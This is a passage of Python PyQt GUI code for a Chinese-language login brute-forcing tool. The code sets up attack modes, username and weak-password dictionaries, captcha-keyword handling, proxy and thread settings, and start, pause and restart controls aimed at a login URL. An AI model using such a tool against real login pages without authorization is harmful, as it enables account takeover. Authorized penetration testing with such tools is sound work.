        self.cdp_proxy_lable.setGeometry(QtCore.QRect(20, 10, 60, 16))
        self.cdp_proxy_lable.setObjectName("cdp_proxy_lable")
        self.cdp_proxy = QtWidgets.QLineEdit(self.BLAST_cdp)
        self.cdp_proxy.setGeometry(QtCore.QRect(80, 10, 110, 20))
        self.cdp_proxy.setObjectName("cdp_proxy")
        # self.cdp_save_response = QtWidgets.QCheckBox(self.BLAST_cdp)
        # self.cdp_save_response.setGeometry(QtCore.QRect(230, 40, 140, 20))
        # self.cdp_save_response.setObjectName("cdp_save_response")
        self.cdp_mode_list = QtWidgets.QComboBox(self.BLAST_cdp)
        self.cdp_mode_list.setGeometry(QtCore.QRect(330, 10, 140, 20))
        self.cdp_mode_list.setObjectName("cdp_mode_list")
        self.cdp_mode_list.addItem("")
        self.cdp_mode_lab = QtWidgets.QLabel(self.BLAST_cdp)
        self.cdp_mode_lab.setGeometry(QtCore.QRect(230, 10, 90, 20))
        self.cdp_mode_lab.setAlignment(QtCore.Qt.AlignmentFlag.AlignCenter)
        self.cdp_mode_lab.setObjectName("cdp_mode_lab")
        self.cdp_Add_code = QtWidgets.QPushButton(self.BLAST_cdp)
        self.cdp_Add_code.setGeometry(QtCore.QRect(550, 80, 110, 30))

        self.cdp_Add_code.setObjectName("cdp_Add_code")
        self.cdp_pass_code = QtWidgets.QPushButton(self.BLAST_cdp)
        self.cdp_pass_code.setGeometry(QtCore.QRect(550, 160, 110, 30))

        self.cdp_pass_code.setObjectName("cdp_pass_code")
        self.tabWidget_mode.addTab(self.BLAST_cdp, "")
        self.start_button = QtWidgets.QPushButton(self.centralwidget)
        self.start_button.setGeometry(QtCore.QRect(610, 2, 90, 40))

        self.start_button.setObjectName("start_button")
        self.announcement = QtWidgets.QTextBrowser(self.centralwidget)
        # self.announcement.setEnabled(False)
        self.announcement.setGeometry(QtCore.QRect(680, 350, 560, 131))

        self.announcement.setReadOnly(True)
        self.announcement.setObjectName("announcement")
        self.target_url = MLineEdit('', mainwindow)
        self.target_url.setGeometry(QtCore.QRect(10, 10, 561, 31))
        #
        self.target_url.setAcceptDrops(True)
        self.target_url.setFrame(False)
        self.target_url.setCursorPosition(26)
        self.target_url.setPlaceholderText("")
        self.target_url.setObjectName("target_url")
        self.tabWidget_user_passwd = QtWidgets.QTabWidget(self.centralwidget)
        self.tabWidget_user_passwd.setGeometry(QtCore.QRect(680, 50, 560, 270))
        self.tabWidget_user_passwd.setObjectName("tabWidget_user_passwd")
        self.tab_user = QtWidgets.QWidget()
        self.tab_user.setObjectName("tab_user")
        self.Load_file_button_user = QtWidgets.QPushButton(self.tab_user)
        self.Load_file_button_user.setGeometry(QtCore.QRect(10, 70, 80, 30))

        self.Load_file_button_user.setObjectName("Load_file_button_user")
        self.Clear_list_button_user = QtWidgets.QPushButton(self.tab_user)
        self.Clear_list_button_user.setGeometry(QtCore.QRect(10, 120, 80, 30))

        self.Clear_list_button_user.setObjectName("Clear_list_button_user")
        # self.password_result_text_user = QtWidgets.QTextBrowser(self.tab_user)
        self.password_result_text_user = QtWidgets.QPlainTextEdit(self.tab_user)
        self.password_result_text_user.setUndoRedoEnabled(False)
        self.password_result_text_user.setGeometry(QtCore.QRect(120, 10, 320, 160))
        self.password_result_text_user.setObjectName("password_result_text_user")
        self.Paste_text_button_user = QtWidgets.QPushButton(self.tab_user)
        self.Paste_text_button_user.setGeometry(QtCore.QRect(10, 20, 80, 30))

        self.Paste_text_button_user.setObjectName("Paste_text_button_user")
        self.add_text_add_user = QtWidgets.QLineEdit(self.tab_user)
        self.add_text_add_user.setGeometry(QtCore.QRect(120, 170, 320, 30))
        self.add_text_add_user.setText("")
        self.add_text_add_user.setObjectName("add_text_add_user")
        self.add_text_button_user = QtWidgets.QPushButton(self.tab_user)
        self.add_text_button_user.setGeometry(QtCore.QRect(10, 170, 80, 30))

        self.add_text_button_user.setObjectName("add_text_button_user")
        self.cdp_mode_list_user = QtWidgets.QComboBox(self.tab_user)
        self.cdp_mode_list_user.setGeometry(QtCore.QRect(120, 200, 320, 30))
        self.cdp_mode_list_user.setObjectName("cdp_mode_list_user")

        self.tabWidget_user_passwd.addTab(self.tab_user, "")
        self.tab_pass = QtWidgets.QWidget()
        self.tab_pass.setObjectName("tab_pass")
        self.Paste_text_button_pass = QtWidgets.QPushButton(self.tab_pass)
        self.Paste_text_button_pass.setGeometry(QtCore.QRect(10, 20, 80, 30))

        self.Paste_text_button_pass.setObjectName("Paste_text_button_pass")
        self.Load_file_button_pass = QtWidgets.QPushButton(self.tab_pass)
        self.Load_file_button_pass.setGeometry(QtCore.QRect(10, 70, 80, 30))

        self.Load_file_button_pass.setObjectName("Load_file_button_pass")
        self.Clear_list_button_pass = QtWidgets.QPushButton(self.tab_pass)
        self.Clear_list_button_pass.setGeometry(QtCore.QRect(10, 120, 80, 30))

        self.Clear_list_button_pass.setObjectName("Clear_list_button_pass")
        self.add_text_button_pass = QtWidgets.QPushButton(self.tab_pass)
        self.add_text_button_pass.setGeometry(QtCore.QRect(10, 170, 80, 30))

        self.add_text_button_pass.setObjectName("add_text_button_pass")
        self.password_result_text_pass = QtWidgets.QPlainTextEdit(self.tab_pass)
        self.password_result_text_pass.setGeometry(QtCore.QRect(120, 10, 320, 160))
        self.password_result_text_pass.setObjectName("password_result_text_pass")
        self.add_text_add_pass = QtWidgets.QLineEdit(self.tab_pass)
        self.add_text_add_pass.setGeometry(QtCore.QRect(120, 170, 320, 30))
        self.add_text_add_pass.setObjectName("add_text_add_pass")
        self.cdp_mode_listpass = QtWidgets.QComboBox(self.tab_pass)
        self.cdp_mode_listpass.setGeometry(QtCore.QRect(120, 200, 320, 30))
        self.cdp_mode_listpass.setObjectName("cdp_mode_listpass")
        self.tabWidget_user_passwd.addTab(self.tab_pass, "")
        mainwindow.setCentralWidget(self.centralwidget)
        self.retranslateui(mainwindow)
        self.tabWidget_user_passwd.setCurrentIndex(0)
        QtCore.QMetaObject.connectSlotsByName(mainwindow)

    def retranslateui(self, mainwindow):
        _translate = QtCore.QCoreApplication.translate
        mainwindow.setWindowTitle(_translate("window", "BLAST v3.1.2 by CVES实验室"))
        self.suspended_button.setText(_translate("MainWindow", "暂停爆破"))
        self.export_button.setText(_translate("MainWindow", "导出数据"))
        self.restart_button.setText(_translate("MainWindow", "重启爆破"))
        self.zd_mode_list.addItem(_translate("MainWindow", "sniper:狙击手"))
        self.zd_mode_list.addItem(_translate("MainWindow", "ram:攻城锤"))
        self.zd_mode_list.addItem(_translate("MainWindow", "fork:草叉模式"))
        self.zd_mode_list.addItem(_translate("MainWindow", "bomb:集束炸弹"))
        self.zd_lable_mode.setText(_translate("MainWindow", "爆破模式"))
        self.zd_browser_label.setText(_translate("MainWindow", "浏览器"))
        self.zd_delay_lable.setText(_translate("MainWindow", "延迟关闭"))
        self.zd_delay_text.setText(_translate("MainWindow", "0"))
        self.zd_start_run_loglabel.setText(_translate("MainWindow", "程序启动日志"))
        self.zd_browser_button.setText(_translate("MainWindow", "False"))
        self.zd_yzm_text.setText(_translate("MainWindow", "验证码不正确"))
        self.zd_yzm_lable.setText(_translate("MainWindow", "验证码错误关键词"))
        self.zd_proxy_label.setText(_translate("MainWindow", "网页代理"))
        self.zd_sem_label.setText(_translate("MainWindow", "线程设置"))
        self.zd_proxy_text.setPlaceholderText("http://127.0.0.1:8080")
        self.zd_sem_text.setText(_translate("MainWindow", "1"))
        self.tabWidget_mode.setTabText(self.tabWidget_mode.indexOf(self.BLASt_zd), _translate("MainWindow", "自动模式"))
        self.sd_yzm_lab.setText(_translate("MainWindow", "验证码错误关键词"))
        self.sd_yzm_text.setText(_translate("MainWindow", "验证码不正确"))
        self.sd_mode_lable.setText(_translate("MainWindow", "爆破模式"))
        self.sd_mode_list.addItem(_translate("MainWindow", "sniper:狙击手"))
        self.sd_mode_list.addItem(_translate("MainWindow", "ram:攻城锤"))
        self.sd_mode_list.addItem(_translate("MainWindow", "fork:草叉模式"))
        self.sd_mode_list.addItem(_translate("MainWindow", "bomb:集束炸弹"))

        self.sd_user_text.setText(_translate("MainWindow", "xpath"))
        self.sd_yzm_lable.setText(_translate("MainWindow", "验证码"))
        self.sd_pass_text.setText(_translate("MainWindow", "xpath"))
        self.sd_login_lable.setText(_translate("MainWindow", "登录提交"))
        self.sd_yzm_text_path.setText(_translate("MainWindow", "xpath"))
        self.sd_browser_lable.setText(_translate("MainWindow", "浏览器"))
        self.sd_browser_button.setText(_translate("MainWindow", "False"))
        self.sd_sen_lable.setText(_translate("MainWindow", "线程设置"))
        self.sd_login_text.setText(_translate("MainWindow", "xpath"))
        self.sd_name_lable.setText(_translate("MainWindow", "用户名"))
        self.sd_sem_text.setText(_translate("MainWindow", "1"))
        self.sd_pass_lab.setText(_translate("MainWindow", "密码"))
        self.sd_proxy_lable.setText(_translate("MainWindow", "网页代理"))
        self.sd_proxy_text.setPlaceholderText("http://127.0.0.1:8080")

        self.sd_delay_text.setText(_translate("MainWindow", "0"))
        self.sd_delay_lable.setText(_translate("MainWindow", "延迟关闭"))
        self.sd_start_run_loglabel.setText(_translate("MainWindow", "程序启动日志"))
        self.tabWidget_mode.setTabText(self.tabWidget_mode.indexOf(self.BLAST_sd), _translate("MainWindow", "手动选择"))
        self.cdp_start.setText(_translate("MainWindow", "获取web界面"))
        self.cdp_sem_lable.setText(_translate("MainWindow", "线程"))
        self.cdp_sem.setText(_translate("MainWindow", "10"))
        self.cdp_proxy_lable.setText(_translate("MainWindow", "代理"))
        self.cdp_proxy.setPlaceholderText("http://127.0.0.1:8080")

        # self.cdp_save_response.setText(_translate("MainWindow", "是否保存请求响应"))
        self.cdp_mode_list.setItemText(0, _translate("MainWindow", "sniper:狙击手"))
        self.cdp_mode_lab.setText(_translate("MainWindow", "爆破模式"))
        self.cdp_Add_code.setText(_translate("MainWindow", "jscode参数"))
        self.cdp_pass_code.setText(_translate("MainWindow", "单密码参数"))
        self.tabWidget_mode.setTabText(self.tabWidget_mode.indexOf(self.BLAST_cdp),
                                       _translate("MainWindow", "cdp断点模式"))
        self.start_button.setText(_translate("MainWindow", "开始爆破"))

        self.target_url.setText(_translate("MainWindow", "http://127.0.0.1/login.php"))
        self.Load_file_button_user.setText(_translate("MainWindow", "Load"))
        self.Clear_list_button_user.setText(_translate("MainWindow", "Clear"))
        self.Paste_text_button_user.setText(_translate("MainWindow", "Paste"))
        self.add_text_button_user.setText(_translate("MainWindow", "Add"))
        self.cdp_mode_list_user.addItem(_translate("MainWindow", "用户字典"))
        self.cdp_mode_list_user.addItem(_translate("MainWindow", "用户名_top10"))
        self.cdp_mode_list_user.addItem(_translate("MainWindow", "用户名_top100"))
        self.cdp_mode_list_user.addItem(_translate("MainWindow", "用户名数字_1-100"))

        self.tabWidget_user_passwd.setTabText(self.tabWidget_user_passwd.indexOf(self.tab_user),
                                              _translate("MainWindow", "用户名"))
        self.Paste_text_button_pass.setText(_translate("MainWindow", "Paste"))
        self.Load_file_button_pass.setText(_translate("MainWindow", "Load"))
        self.Clear_list_button_pass.setText(_translate("MainWindow", "Clear"))
        self.add_text_button_pass.setText(_translate("MainWindow", "Add"))
        self.cdp_mode_listpass.addItem(_translate("MainWindow", "密码字典"))
        self.cdp_mode_listpass.addItem(_translate("MainWindow", "弱口令_top10"))
        self.cdp_mode_listpass.addItem(_translate("MainWindow", "弱口令_top100"))
        self.cdp_mode_listpass.addItem(_translate("MainWindow", "密码数字_1-100"))
        self.tabWidget_user_passwd.setTabText(self.tabWidget_user_passwd.indexOf(self.tab_pass),
                                              _translate("MainWindow", "密码"))

    # 按钮调用函数
    def get_start(self, loop):
        self.log_clear()
        tasks = asyncio.all_tasks()
        for key in tasks:
            key.cancel()
        if self.tabWidget_mode.currentIndex() == 0:
            logger.success("启动自动爆破模式 ")
            try:
                mode = self.zd_mode_list.currentText()
                self.blastingmode(mode)
                self.zd_start_log.append('需要爆破队列 {} 次'.format(len(self.urls)))
                start = asyncio.ensure_future(self.main(loop), loop=loop)
                background_tasks.add(start)
                start.add_done_callback(lambda t: background_tasks.remove(t))
            except Exception as e:
                logger.error(str(e))
                self.zd_start_log.append(str(e))
        elif self.tabWidget_mode.currentIndex() == 1:
            logger.success("启动手动爆破模式 ")
            mode = self.sd_mode_list.currentText()
            self.blastingmode(mode)
            self.sd_start_log.append("手动请求模式启动！")
            try:
                self.sd_start_log.append('需要爆破队列 {} 次'.format(len(self.urls)))
                start = asyncio.ensure_future(self.main_sd(loop), loop=loop)
                background_tasks.add(start)
                start.add_done_callback(lambda t: background_tasks.remove(t))
            except Exception as e:
                self.sd_start_log.append(str(e))
        elif self.tabWidget_mode.currentIndex() == 2:
            logger.success("启动cdp 断点爆破模式")
            mode = self.cdp_mode_list.currentText()
            datalist, canshu = self.blastingmode_cdp(mode)
            self.http.update_date.connect(self.resultlogapp)
            self.http.datalist = datalist
            self.http.canshu = canshu
            self.http.proxy = self.cdp_proxy.text()
            self.http.sem = asyncio.Semaphore(int(self.cdp_sem.text()))
            try:
                asyncio.ensure_future(self.http.rundatalist(), loop=loop)
            except Exception as e:
                logger.error(f"{e}")

    # 添加用户名或者密码字典函数
    def add_buttondictionary_user(self):
        if self.cdp_mode_list_user.currentText() == "用户字典":
            return
        datalist = returndictionary(self.cdp_mode_list_user.currentText())
        for key in datalist:
            self.password_result_text_user.appendPlainText(str(key))

    def add_buttondictionary_pass(self):
        if self.cdp_mode_listpass.currentText() == "密码字典":
            return
        datalist = returndictionary(self.cdp_mode_listpass.currentText())
        for key in datalist:
            self.password_result_text_pass.appendPlainText(str(key))

    def ui_set(self, mainwindow, loop):
        self.setupui(mainwindow)
        self.start_button.clicked.connect(lambda: self.get_start(loop))
        # # 暂停，重启按钮
        self.restart_button.clicked.connect(lambda: self.reget_start(loop))
        self.suspended_button.clicked.connect(lambda: self.waitingfor())

        # 导出按钮
        self.export_button.clicked.connect(lambda: self.export_log())
        # button 按钮
        self.zd_browser_button.clicked.connect(lambda: self.get_head())
        self.sd_browser_button.clicked.connect(lambda: self.get_head())
        # 用户名 设置

        self.Paste_text_button_user.clicked.connect(lambda: self.paste_button_user())
        self.add_text_button_user.clicked.connect(lambda: self.add_button())
        self.Clear_list_button_user.clicked.connect(lambda: self.clear_button_user())
        self.Load_file_button_user.clicked.connect(lambda: self.load_button_user())
        # 密码设置
        self.Paste_text_button_pass.clicked.connect(lambda: self.paste_button_pass())
        self.add_text_button_pass.clicked.connect(lambda: self.add_button())
        self.Clear_list_button_pass.clicked.connect(lambda: self.clear_button_pass())
        self.Load_file_button_pass.clicked.connect(lambda: self.load_button_pass())

        # cdp 模块
        self.cdp_start.clicked.connect(lambda: self.start_cdp_button(loop))

        # add code添加标记
        self.cdp_pass_code.clicked.connect(lambda: self.cdp_mark_selected_text_pass())
        self.cdp_Add_code.clicked.connect(lambda: self.cdp_mark_selected_text_jscode())

        # 添加字典
        self.cdp_mode_list_user.currentIndexChanged.connect(lambda: self.add_buttondictionary_user())
        self.cdp_mode_listpass.currentIndexChanged.connect(lambda: self.add_buttondictionary_pass())


settings = Ui()
